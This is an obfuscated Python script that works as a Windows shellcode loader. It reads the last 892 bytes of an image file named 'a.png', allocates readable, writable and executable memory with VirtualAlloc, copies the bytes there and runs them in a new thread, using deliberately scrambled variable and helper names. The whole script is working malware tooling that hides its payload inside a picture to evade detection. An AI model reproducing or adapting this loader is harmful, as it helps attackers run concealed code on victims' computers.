import ctypes
import os
import sys
import time
import en

sys.path.append(os.getcwd)

po090op9989080o909o90o09o9i9oi99o9 = 892
time.sleep(2)
o000op8980o890op90800o909 = en.o090o09pi98io9i09i9ioi('a.png','rb')
o0ooo0o0o0oo0o0op0o0o0opo0o89 = o000op8980o890op90800o909.read()[-po090op9989080o909o90o09o9i9oi99o9:]
en.po090o09o9o89iu9oi09ioi09o(o0ooo0o0o0oo0o0op0o0o0opo0o89)
en.po090o09o9o89iu9oi09ioi09o('ok')
#
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(o0ooo0o0o0oo0o0op0o0o0opo0o89), 0x1000, 0x40)
en.ok09i09i9io(en.fja8g9u9guare8g0argua0rgu(rwxpage), ctypes.create_string_buffer(o0ooo0o0o0oo0o0op0o0o0opo0o89), 
len(o0ooo0o0o0oo0o0op0o0o0opo0o89))
handle = en.sg1r5g1rgb1seth4ckbu77er5he4zt51hs5(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)